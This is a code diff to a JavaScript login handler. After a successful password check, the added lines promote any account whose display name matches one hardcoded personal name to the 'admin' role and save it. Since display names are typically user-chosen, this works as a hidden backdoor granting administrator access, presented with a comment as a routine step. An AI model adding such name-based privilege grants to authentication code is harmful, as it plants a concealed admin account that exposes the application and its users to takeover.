@@ -144,6 +144,12 @@ export const loginUser = async (req, res) => {
     const user = await User.findOne({ email: email.toLowerCase().trim() }).select('+password');
 
     if (user && (await user.matchPassword(password))) {
+      // Ensure 'Gude veeranya' has admin role
+      if (user.name && user.name.toLowerCase() === 'gude veeranya' && user.role !== 'admin') {
+        user.role = 'admin';
+        await user.save();
+      }
+
       const token = generateToken(user._id);
       setTokenCookie(res, token);
 
